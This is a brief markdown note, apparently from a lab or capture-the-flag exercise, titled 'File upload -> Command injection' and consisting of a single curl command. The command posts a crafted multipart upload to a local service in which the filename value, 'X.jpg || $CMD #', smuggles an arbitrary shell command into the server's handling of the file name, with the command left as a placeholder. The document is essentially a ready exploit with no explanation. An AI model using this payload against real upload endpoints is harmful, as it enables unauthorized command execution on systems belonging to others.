# File upload -> Command injection

```bash
CMD="" && curl -X POST http://127.0.0.1:5000/upload   -H 'Content-Type: multipart/form-data; boundary=----x'   --data-binary "$(printf '%b' "------x\rContent-Disposition: form-data; name=\"product_id\"\r\r1\r------x\rContent-Disposition: form-data; name=\"image\"; filename=\"X.jpg || $CMD #\"\rContent-Type: image/png\r\r\r------x--\r")"
```